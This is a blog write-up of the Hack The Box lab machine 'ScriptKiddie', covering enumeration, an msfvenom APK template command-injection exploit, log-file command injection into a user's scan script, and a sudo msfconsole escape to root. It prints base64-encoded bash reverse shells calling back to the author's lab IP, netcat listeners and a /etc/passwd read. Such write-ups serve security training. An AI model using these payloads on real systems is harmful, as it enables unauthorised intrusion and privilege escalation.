---
layout: post
title: "HTB: ScriptKiddie"
box: scriptkiddie
img: /img/scriptkiddie/scriptkiddie
author: Andrew Cherney
date: 2024-03-31 01:54:49
tags: htb easy-box linux webapp cve python command-injection bash
icon: "assets/icons/scriptkiddie.png"
post_description: "As an avid puzzle game enjoyer I have a deep appreciation for this box from a design perspective. The initial foothold post-nmap scan is determinable with the tools presented on the webpage. Once user is gained you need to pivot with command injection, then use a GTFObin for root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -p- 10.10.10.226 -Pn

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp


nmap -sC -sV -p22,5000 10.10.10.226

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 5000

![front page]({{ page.img }}_front_page.png)

A small webpage for utilizing tools in the web interface instead of CLI. Something similar to what this site will have in the future as a functionality wink wink nudge nudge. Anyway we have 3 available tools: **msfvenom** **nmap** and **searchsploit**. Well what we can do here is search for each of these tools within searchsploit to see what comes up.

![searchsploit msfvenom search]({{ page.img }}_searchsploit_snitch.png)

# User as kid

## APK command injection

And as luck would have it there is an APK file command injection exploit available. APK is a file format for android, and that python script creates a malicious APK with your provided payload (under the change me section). I tossed a reverse shell into that payload and generated the APK file.

```bash
/venomshell.py 
[+] Manufacturing evil apkfile
Payload: echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzc3NzcgMD4mMQ==" | base64 -d | bash
-dname: CN='|echo ZWNobyAiWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0M0x6YzNOemNnTUQ0bU1RPT0iIHwgYmFzZTY0IC1kIHwgYmFzaA== | base64 -d | sh #

  adding: empty (stored 0%)
Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 90 days
	for: CN="'|echo ZWNobyAiWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0M0x6YzNOemNnTUQ0bU1RPT0iIHwgYmFzZTY0IC1kIHwgYmFzaA== | base64 -d | sh #"
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpb54ltyb5/evil.apk
Do: msfvenom -x /tmp/tmpb54ltyb5/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

Upload it, be sure to select android, and set lhost to 127.0.0.1 as per requested by the script.

![apk upload]({{ page.img }}_msfvenom_apk.png)

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.10.226 33180
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ cd ~
cd ~
kid@scriptkiddie:~$ cat user.txt
cat user.txt
8a610587a-----------------------
```

# User as pwn

## hacker scan exploitation

During the initial enum process I find another user by the name of _pwn_, whose home directory I can read partially.

```bash
kid@scriptkiddie:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
kid@scriptkiddie:~$ ls /home
kid  pwn
kid@scriptkiddie:~$ find / -user "pwn" 2>/dev/null
/home/pwn
/home/pwn/recon
/home/pwn/.bash_logout
/home/pwn/.local
/home/pwn/.local/share
/home/pwn/.selected_editor
/home/pwn/.bashrc
/home/pwn/.cache
/home/pwn/.profile
/home/pwn/.ssh
/home/pwn/scanlosers.sh
kid@scriptkiddie:~$ cd /home/pwn
kid@scriptkiddie:/home/pwn$ ls
recon  scanlosers.sh
```

In this directory is a file for scanning the "hacking" attempts by injecting special characters into the input fields of the site at port 5000. There seems to be broken functionality of populating this file, however I can look through the webapp and determine the format before attempting to manipulate it.

```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$ ls ../kid/logs/
hackers
kid@scriptkiddie:/home/pwn$ cat ../kid/logs/hackers 
```

After checking the original webapp I come across the line to create log entries: `f.write(f'[{datetime.datetime.now()}] {srcip}\n')`

Now I can't decipher exactly what this looks like alone but my handy tool python cli can allow me to run this code and get the presumable output.

```python
python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> srcip = "10.10.14.7"
>>> f'[{datetime.datetime.now()}] {srcip}\n'
'[2024-03-30 22:26:05.101147] 10.10.14.7\n'
```

A simple format, which is further refines in **scanlosers.sh** by stripping the date and scanning the IP. In this instance I have unfiltered inputs directly to the cat command and can inject whatever linux commands I desire. As a proof of concept I create the following payload of whoami and check the output of the script on my machine:

```bash
test.sh

log="[2024-03-30 22:26:05.101147] 10.10.14.7 `whoami`"
echo $log | cut -d' ' -f3- | sort -u


bash test.sh 

10.10.14.7 raccoon
```

Easy as pie. In the case of this script it is an SUID running as pwn, allowing me to run it and gain permissions as pwn so long as I replace whoami with a proper reverse shell.

```bash
[2024-03-30 22:26:05.101147] 10.10.14.7 `echo'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzc3NzcgMD4mMQ==' | base64 -d | bash`

kid@scriptkiddie:/home/pwn$ nano ~/logs/hackers
kid@scriptkiddie:/home/pwn$ bash scanlosers.sh 
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.10.226 33304
bash: cannot set terminal process group (870): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 
```

I then upgraded my shell for better functionality by generating a keypair and ssh-ing in. 

# Root

## msfconsole

Pretty straight forward here, sudo -l is a common place to look msfconsole no doubt gives us access to a shell to manipulate the local filesystem and with sudo that shell is root. Always be weary of giving sudo access to commands or programs with ways to make their own shells. 

The payload: [https://gtfobins.github.io/gtfobins/msfconsole/](https://gtfobins.github.io/gtfobins/msfconsole/)

```bash
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
sudo /opt/metasploit-framework-6.0.9/msfconsole

msf6 > irb
stty: 'standard input': Inappropriate ioctl for device
[*] Starting IRB shell...
[*] You are in the "framework" object

system("/bin/sh")
Switch to inspect mode.
irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/sh")
whoami
root
cat /root/root.txt
d45dade12------------------------
```

